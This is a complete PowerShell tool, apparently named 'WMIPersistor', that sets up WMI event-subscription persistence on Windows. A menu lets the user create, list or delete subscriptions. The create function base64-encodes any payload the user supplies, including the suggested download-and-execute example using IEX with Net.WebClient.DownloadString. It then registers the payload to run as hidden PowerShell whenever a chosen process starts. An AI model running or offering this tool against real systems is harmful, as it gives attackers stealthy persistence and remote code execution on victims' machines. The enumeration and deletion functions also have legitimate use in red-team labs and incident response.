function Encode-Payload($Command) {
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
    $Encoded = [Convert]::ToBase64String($Bytes)
    return $Encoded
}

function Create-Subscription {
    $ProcessName = Read-Host "Enter the process name to monitor (e.g., notepad.exe)"
    $RawPayload = Read-Host "Enter the raw PowerShell payload (e.g., IEX (New-Object Net.WebClient).DownloadString('http://...'))"

    $EncodedPayload = Encode-Payload $RawPayload
    $FinalPayload = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc $EncodedPayload"

    try {
        # 1. Create the Event Filter
        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = "$($ProcessName)_Filter"
            EventNamespace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '$ProcessName'"
        } -ErrorAction Stop

        # 2. Create the Event Consumer
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = "$($ProcessName)_Consumer"
            CommandLineTemplate = $FinalPayload
        } -ErrorAction Stop

        # 3. Bind Event Filter to Event Consumer
        $Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $Filter.__RELPATH
            Consumer = $Consumer.__RELPATH
        } -ErrorAction Stop
    }
    catch {
        Write-Host "`n[!] Error creating WMI subscription: $($_.Exception.Message)`n"
        Pause
        Show-Menu
        return
    }

    # Verify creation
    $CheckFilter   = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$($ProcessName)_Filter'" -ErrorAction SilentlyContinue
    $CheckConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$($ProcessName)_Consumer'" -ErrorAction SilentlyContinue
    $CheckBinding  = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*$($ProcessName)_Filter*" -and $_.Consumer -like "*$($ProcessName)_Consumer*" }

    if ($CheckFilter -and $CheckConsumer -and $CheckBinding) {
        Write-Host "`n[+] WMI Event Subscription created successfully."
        Write-Host "Trigger process: $ProcessName"
        Write-Host "Raw Payload: $RawPayload"
        Write-Host "Encoded Payload: $EncodedPayload`n"
    } else {
        Write-Host "`n[!] Failed to create WMI Event Subscription for process '$ProcessName'.`n"
    }

    Pause
    Show-Menu
}

function Query-Subscriptions {
    Write-Host "`n--- Event Filters ---"
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Format-Table Name, Query, EventNamespace -Wrap -AutoSize

    Write-Host "`n--- Event Consumers ---"
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Format-Table Name, CommandLineTemplate -Wrap -AutoSize

    Write-Host "`n--- Filter to Consumer Bindings ---"
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Format-Table Filter, Consumer -Wrap -AutoSize

    Write-Host "`n[+] Query completed.`n"
    Pause
    Show-Menu
}

function Delete-Subscription {
    Write-Host "`nCurrent WMI Subscriptions:`n"
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name
    $Name = Read-Host "`nEnter the base name (or part of the name) of the subscription to delete"

    # Find all matching filters, consumers, and bindings dynamically
    $Filters   = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -like "*$Name*" }
    $Consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -like "*$Name*" }
    $Bindings  = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*$Name*" -or $_.Consumer -like "*$Name*" }

    if ($Filters -or $Consumers -or $Bindings) {
        if ($Bindings) { $Bindings | ForEach-Object { $_.Delete() } }
        if ($Consumers) { $Consumers | ForEach-Object { $_.Delete() } }
        if ($Filters) { $Filters | ForEach-Object { $_.Delete() } }

        Write-Host "`n[+] Subscriptions matching '$Name' deleted successfully.`n"
    } else {
        Write-Host "`n[!] No subscription found matching '$Name'.`n"
    }

    Pause
    Show-Menu
}



function Show-Menu {
    Clear-Host
    Write-Host "======================================================="
    Write-Host "# __      ____  __ ___ ___            _    _           "
               "# \ \    / /  \/  |_ _| _ \___ _ _ __(_)__| |_ ___ _ _ "
               "#  \ \/\/ /| |\/| || ||  _/ -_) '_(_-< (_-<  _/ _ \ '_|"
               "#   \_/\_/ |_|  |_|___|_| \___|_| /__/_/__/\__\___/_|  "
    Write-Host "======================================================="
    Write-Host "1. Create WMI Event Subscription"
    Write-Host "2. Query existing WMI Event Subscriptions"
    Write-Host "3. Delete a WMI Event Subscription"
    Write-Host "4. Exit"
    $Choice = Read-Host "Enter your choice (1, 2, 3 or 4)"

    switch ($Choice) {
        1 { Create-Subscription }
        2 { Query-Subscriptions }
        3 { Delete-Subscription }
        4 { exit }
        default { Write-Host "`n[!] Invalid choice. Try again.`n"; Pause; Show-Menu }
    }
}

# Start menu
Show-Menu
